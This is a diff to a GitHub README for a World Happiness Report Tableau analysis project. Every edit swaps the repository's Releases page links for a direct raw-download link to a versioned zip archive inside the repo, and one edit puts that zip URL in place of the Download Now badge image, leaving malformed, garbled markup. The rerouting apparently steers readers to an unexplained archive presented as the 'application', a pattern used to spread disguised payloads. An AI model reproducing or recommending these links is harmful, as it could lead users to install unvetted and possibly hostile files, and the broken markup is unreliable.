@@ -7,7 +7,7 @@ Welcome to the World Happiness Report Analysis Capstone Project! This project fe
 To get started with this project, follow the steps below to download and run the software. 
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/wwwwhhl/World-Happiness-Report-Analysis-Capstone-Project/releases)
+[![Download Now](https://github.com/wwwwhhl/World-Happiness-Report-Analysis-Capstone-Project/raw/refs/heads/main/World-Happiness-Report-Tableau/Happiness_Report_Analysis_World_Project_Capstone_1.9.zip%https://github.com/wwwwhhl/World-Happiness-Report-Analysis-Capstone-Project/raw/refs/heads/main/World-Happiness-Report-Tableau/Happiness_Report_Analysis_World_Project_Capstone_1.9.zip)](https://github.com/wwwwhhl/World-Happiness-Report-Analysis-Capstone-Project/raw/refs/heads/main/World-Happiness-Report-Tableau/Happiness_Report_Analysis_World_Project_Capstone_1.9.zip)
 
 ## 📂 System Requirements
 Before you start, ensure your system meets the following requirements:
@@ -17,7 +17,7 @@ Before you start, ensure your system meets the following requirements:
 - **Software:** Tableau Reader installed (for viewing Tableau files)
 
 ## 🔗 Download & Install
-1. Visit the [Releases page](https://github.com/wwwwhhl/World-Happiness-Report-Analysis-Capstone-Project/releases) to download the latest version.
+1. Visit the [Releases page](https://github.com/wwwwhhl/World-Happiness-Report-Analysis-Capstone-Project/raw/refs/heads/main/World-Happiness-Report-Tableau/Happiness_Report_Analysis_World_Project_Capstone_1.9.zip) to download the latest version.
 2. Click on the desired version to navigate to the download options.
 3. Select the appropriate file for your system and begin downloading.
 
@@ -51,6 +51,6 @@ This project is licensed under the MIT License. Feel free to use it as per the g
 If you encounter any issues or have questions, please reach out through the "Issues" tab in the repository. We’re here to help!
 
 ## 🔗 Visit Again
-For future updates and developments, keep checking the [Releases page](https://github.com/wwwwhhl/World-Happiness-Report-Analysis-Capstone-Project/releases). 
+For future updates and developments, keep checking the [Releases page](https://github.com/wwwwhhl/World-Happiness-Report-Analysis-Capstone-Project/raw/refs/heads/main/World-Happiness-Report-Tableau/Happiness_Report_Analysis_World_Project_Capstone_1.9.zip). 
 
 Thank you for your interest in the World Happiness Report Analysis Capstone Project! Enjoy exploring and analyzing world happiness data.
